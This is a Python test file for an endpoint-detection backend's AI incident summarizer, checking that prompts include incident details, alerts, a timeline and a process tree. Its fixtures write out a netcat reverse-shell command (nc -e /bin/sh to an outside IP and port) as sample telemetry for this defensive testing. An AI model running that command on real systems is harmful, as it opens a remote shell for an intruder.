from datetime import datetime, timezone
from types import SimpleNamespace

from edr_backend.ai import summarizer


def _incident():
    return SimpleNamespace(
        title="Reverse shell via netcat",
        hostname="victim-01",
        severity="critical",
        first_alert_at=datetime(2026, 7, 8, 10, 0, tzinfo=timezone.utc),
        last_alert_at=datetime(2026, 7, 8, 10, 5, tzinfo=timezone.utc),
    )


def _alert(rule_id="r1", title="Reverse shell via netcat", severity="critical", technique_id="T1059"):
    return SimpleNamespace(rule_id=rule_id, title=title, severity=severity, technique_id=technique_id)


def test_build_prompt_includes_incident_fields():
    prompt = summarizer.build_prompt(_incident(), [_alert()], [], [])
    assert "Reverse shell via netcat" in prompt
    assert "victim-01" in prompt
    assert "critical" in prompt


def test_build_prompt_includes_alerts():
    prompt = summarizer.build_prompt(_incident(), [_alert(), _alert(rule_id="r2", title="Credential file access")], [], [])
    assert "Credential file access" in prompt
    assert "T1059" in prompt


def test_build_prompt_includes_timeline_with_alert_tags():
    timeline = [
        {"time": "2026-07-08T10:00:05+00:00", "event_type": "process_create",
         "summary": "nc -e /bin/sh 1.2.3.4 4444",
         "alerts": [{"rule_id": "r1", "title": "Reverse shell via netcat", "severity": "critical"}]},
    ]
    prompt = summarizer.build_prompt(_incident(), [_alert()], timeline, [])
    assert "nc -e /bin/sh 1.2.3.4 4444" in prompt
    assert "Reverse shell via netcat" in prompt


def test_build_prompt_includes_nested_process_tree():
    tree = [{"pid": 100, "name": "bash", "cmdline": "bash", "event_id": "e1",
             "children": [{"pid": 200, "name": "nc", "cmdline": "nc -e /bin/sh", "event_id": "e2", "children": []}]}]
    prompt = summarizer.build_prompt(_incident(), [_alert()], [], tree)
    assert "100 bash" in prompt
    assert "200 nc" in prompt


def test_summarize_incident_calls_llm(monkeypatch):
    captured = {}

    def fake_complete(system, user, max_tokens=2048):
        captured["system"] = system
        captured["user"] = user
        return "narrative here"

    monkeypatch.setattr(summarizer.llm_client, "complete", fake_complete)
    result = summarizer.summarize_incident(_incident(), [_alert()], [], [])
    assert result == "narrative here"
    assert "victim-01" in captured["user"]
